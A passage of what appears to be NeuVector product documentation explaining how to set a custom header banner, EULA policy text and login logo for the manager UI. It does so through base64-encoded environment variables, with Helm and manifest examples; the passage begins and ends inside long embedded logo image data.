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"/>
  </svg>

   Run the following command in the neuvector-helm/charts/core to upgrade the NeuVector Helm chart:  helm upgrade neuvector -n neuvector ./   This will apply the customization changes to the UI pages.  ","version":"5.2","tagName":"h3"},{"title":"Verification​","type":1,"pageTitle":"Custom Login, Header and Footer","url":"/5.2/configuration/customui#verification","content":" To verify that the environment variables have been successfully set, you can run the following command:  kubectl get deployment -n neuvector neuvector-manager-pod -o yaml   Check the spec.template.spec.containers.env section to ensure that the desired environment variables are present.  spec: progressDeadlineSeconds: 600 replicas: 1 revisionHistoryLimit: 10 selector: matchLabels: app: neuvector-manager-pod strategy: rollingUpdate: maxSurge: 25% maxUnavailable: 25% type: RollingUpdate template: metadata: creationTimestamp: null labels: app: neuvector-manager-pod release: neuvector spec: containers: - env: - name: CTRL_SERVER_IP value: neuvector-svc-controller.neuvector - name: CUSTOM_PAGE_HEADER_COLOR value: '#ff8c00' - name: CUSTOM_PAGE_HEADER_CONTENT value: WW91IGFyZSBhY2Nlc3NpbmcgYSAmbmJzcDs8Yj4gVS5TLiBHb3Zlcm5tZW50IChVU0cpIEluZm9ybWF0aW9uIFN5c3RlbSAoSVMpIDwvYj4gICAgICB0aGF0IGlzIHByb3ZpZGVkIGZvciBVU0ctYXV0aG9yaXplZCB1c2Ugb25seS4= - name: CUSTOM_EULA_POLICY value: PGg0PgogIFlvdSBhcmUgYWNjZXNzaW5nIGEgVS5TLiBHb3Zlcm5tZW50IChVU0cpIEluZm9ybWF0aW9uIFN5c3RlbSAoSVMpIHRoYXQgaXMgcHJvdmlkZWQgZm9yIFVTRy1hdXRob3JpemVkIHVzZSBvbmx5LgpCeSB1c2luZyB0aGlzIElTICh3aGljaCBpbmNsdWRlcyBhbnkgZGV2aWNlIGF0dGFjaGVkIHRvIHRoaXMgSVMpLCB5b3UgY29uc2VudCB0byB0aGUgZm9sbG93aW5nIGNvbmRpdGlvbnM6CjwvaDQ+CjxwPgotVGhlIFVTRyByb3V0aW5lbHkgaW50ZXJjZXB0cyBhbmQgbW9uaXRvcnMgY29tbXVuaWNhdGlvbnMgb24gdGhpcyBJUyBmb3IgcHVycG9zZXMgaW5jbHVkaW5nLCBidXQgbm90IGxpbWl0ZWQgdG8sIHBlbmV0cmF0aW9uIHRlc3RpbmcsIENPTVNFQyBtb25pdG9yaW5nLCBuZXR3b3JrIG9wZXJhdGlvbnMgYW5kIGRlZmVuc2UsIHBlcnNvbm5lbCBtaXNjb25kdWN0IChQTSksIGxhdyBlbmZvcmNlbWVudCAoTEUpLCBhbmQgY291bnRlcmludGVsbGlnZW5jZSAoQ0kpIGludmVzdGlnYXRpb25zLgo8L3A+CjxwPgotQXQgYW55IHRpbWUsIHRoZSBVU0cgbWF5IGluc3BlY3QgYW5kIHNlaXplIGRhdGEgc3RvcmVkIG9uIHRoaXMgSVMuCjwvcD4K - name: CUSTOM_LOGIN_LOGO value: <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" height="80" xml:space="preserve" version="1.1" viewBox="0 0 300 80">
    <image width="300" height="80" xlink:href="data:image/png;base64,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"/>
  </svg>

   5. Example to customize the UI pages using manifests​  Prerequisites​  Before customizing the UI component, ensure that you have the following:  NeuVector manifest repository: https://github.com/neuvector/manifestsNeuVector installed on your Kubernetes cluster  Steps​  Follow these steps to customize the UI component:  Locate the NeuVector manifests repository in your local environment: https://github.com/neuvector/manifests.Navigate to the manifests/kubernetes directory.Choose the right manifest according to your environment. For example, choose neuvector-containerd-k8s.yaml for a k8s cluster with containerd container runtime.Locate the neuvector-manager-pod deployment section in the manifest file to add the environment variables: CUSTOM_PAGE_HEADER_COLOR: Set the banner color to DarkOrange (#ff8c00).CUSTOM_PAGE_HEADER_CONTENT: Specify the header text using a plain HTML or text, for example &quot;You are accessing a U.S. Government (USG) Information System (IS) that is provided for USG-authorized use only.&quot;, remember to based64 encode it.CUSTOM_EULA_POLICY: Customize the policy content using a plain HTML snippet or text and remember to base64 encode it.CUSTOM_LOGIN_LOGO: Customize the logo with a 300x80 pixel svg file and base64 encode it  --- apiVersion: apps/v1 kind: Deployment metadata: name: neuvector-manager-pod namespace: neuvector spec: selector: matchLabels: app: neuvector-manager-pod replicas: 1 template: metadata: labels: app: neuvector-manager-pod spec: serviceAccountName: basic serviceAccount: basic containers: - name: neuvector-manager-pod image: neuvector/manager:5.3.0 env: - name: CUSTOM_PAGE_HEADER_COLOR value: &quot;#ff8c00&quot; - name: CUSTOM_PAGE_HEADER_CONTENT value: WW91IGFyZSBhY2Nlc3NpbmcgYSAmbmJzcDs8Yj4gVS5TLiBHb3Zlcm5tZW50IChVU0cpIEluZm9ybWF0aW9uIFN5c3RlbSAoSVMpIDwvYj4gICAgICB0aGF0IGlzIHByb3ZpZGVkIGZvciBVU0ctYXV0aG9yaXplZCB1c2Ugb25seS4= - name: CUSTOM_EULA_POLICY value: PGg0PgogIFlvdSBhcmUgYWNjZXNzaW5nIGEgVS5TLiBHb3Zlcm5tZW50IChVU0cpIEluZm9ybWF0aW9uIFN5c3RlbSAoSVMpIHRoYXQgaXMgcHJvdmlkZWQgZm9yIFVTRy1hdXRob3JpemVkIHVzZSBvbmx5LgpCeSB1c2luZyB0aGlzIElTICh3aGljaCBpbmNsdWRlcyBhbnkgZGV2aWNlIGF0dGFjaGVkIHRvIHRoaXMgSVMpLCB5b3UgY29uc2VudCB0byB0aGUgZm9sbG93aW5nIGNvbmRpdGlvbnM6CjwvaDQ+CjxwPgotVGhlIFVTRyByb3V0aW5lbHkgaW50ZXJjZXB0cyBhbmQgbW9uaXRvcnMgY29tbXVuaWNhdGlvbnMgb24gdGhpcyBJUyBmb3IgcHVycG9zZXMgaW5jbHVkaW5nLCBidXQgbm90IGxpbWl0ZWQgdG8sIHBlbmV0cmF0aW9uIHRlc3RpbmcsIENPTVNFQyBtb25pdG9yaW5nLCBuZXR3b3JrIG9wZXJhdGlvbnMgYW5kIGRlZmVuc2UsIHBlcnNvbm5lbCBtaXNjb25kdWN0IChQTSksIGxhdyBlbmZvcmNlbWVudCAoTEUpLCBhbmQgY291bnRlcmludGVsbGlnZW5jZSAoQ0kpIGludmVzdGlnYXRpb25zLgo8L3A+CjxwPgotQXQgYW55IHRpbWUsIHRoZSBVU0cgbWF5IGluc3BlY3QgYW5kIHNlaXplIGRhdGEgc3RvcmVkIG9uIHRoaXMgSVMuCjwvcD4K - name: CUSTOM_LOGIN_LOGO value: <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" height="80" xml:space="preserve" version="1.1" viewBox="0 0 300 80">
    <image width="300" height="80" xlink:href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAABQCAYAAACj6kh7AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAALiMAAC4jAXilP3YAABMkSURBVHhe7Z0JcBTXmcfFYSfYsUHCIMB4cWXJRW0lu0gCcRhhc5rTXMYGZkZISGAkIQTmCoThxiAw0QkCoYNb4hICZ2s369i1m10nXnsrjrNxtrx2srWprdiO46zXju0Y6P1/T9+Me960Rj2jkaal+X5V/5p5733vzesevb/6TXe/ThAEQRAEQRAEQRAEQRAEQRAEQRAEQRAEQRAEQRAEQRAEQRAEQRAEQRAEQRACmbuu5oEFG07vmL/h1M2Fm84YpEWbzhxbsPG0h0MEQRBiw2Mb6mc99vSpC/M2nDLmbzhtzN942oA5KZkMy1i0+azxOGmL0gsLt5wu4SYEQRA6hjlrayvnrK//6dz19QaMSmkeKQzDWkz67jnjCb/Ovr1489kG/ghBEITw8Xq9PWcU1b41q6jug9nr6ow56+qVyKyiaVhPbiWdN5Zsa9HSbef++OS2C29yNwRBEIKZW1jbb8aampsz19YapFmkojpjNqlTDQv63gVjGcu1Xb1+kltVdQd3VRCEeOKRlXX3zyisnjB9TY3xKGtGYY0xs7DFrJxmWK7tDYbb2yKPt9Hw7GgwXPuufH2p9wf38iYJgtA9MHpMW3X8oSn51TXT8quNafknjekFrC5rWI1GJmlno7F850Vj+a6LRvaei4uydl8axhstCEKXwDB6TMo74Zm86vjvp6w+YUzJq1aaqsyq+xpWFit796UW7by4Jnv3xYm8VwRBcAKT86qHPLzq+E7o40lPHTcmPXXCmAyjIsWzYa0g7SFdNnL2ki7V5+y+upJ3myAIncGEFUfnTcytqp24ssp4mLTquPEISZmVGFZrhpWrdMVYua9FufuuvLRy/5VneLfGjP79+7+bmJg4g5N26I06N/m9Jffccw9C+v/jfffdZ+D1TegE3j9PaegmVMGhghBdxmUfrZqQc+wVyMjIbRGZlRhW+wwLZmWs2n9V6alnoP1X/3P1M03P827vNGAm7/fr128mJ+3Qm4yH3weB9v4J5b/F254tOcGgfBa3IWdehfYxNrv8Z+OyKv84fsVR4yFSzlGDzMrphgV9On/D2a8tLGrow5vio8f89WeGLdh4pt7JhrWadKDJyGOtPnD1I7y+Ttej8XZ0CNE2LJTd5rchGTRo0IBQ7QhCEFOWFd+dnll+a2xWpUEal92i8dlHDccb1rr6D+kMJG+Kn9GuivlprlI1aEYtK30k1V3SqAo0ntxyNsPJhpV3sMnIP3jNyC++ZhRAa4qbjYKDzTcbG41evAlRIZqGhbaGQH/iZJtQO0lJSemcFIQvSPOUDxrjKps1OrPcgEkZ6csrjDEsxxtWUe17c4rq/oE3xc/fLCkflrqsZH+au8wIkMmwLMreGu058mCCduSyeOv5B5ZsO/f20m3nbjrVsNYcalEh6fB1Yy1e15fcSCkoifx6sA44wpKjJiEyvuM+fD8N0lEeUrkxmtQFDGtGYe2rM9bWVPJm+ElxlY9PdZX8OMiEdIUyLE1o78MUT9nEsVkH7lEfwizyNt4Jw3ph2ffOv+tYwyI9e90oIh25YayDuPu26QDDmknlaFcu6RDsk+L+fhG9YvB+5mzDOmk8WniyEa/LVccZ+u0mxV3qTnOXvm5lNCEVhmFZCSaWlbq88quqIyaWbrtQ5vE2/ItzDat5HXfVNtE2LB+IyYGuQ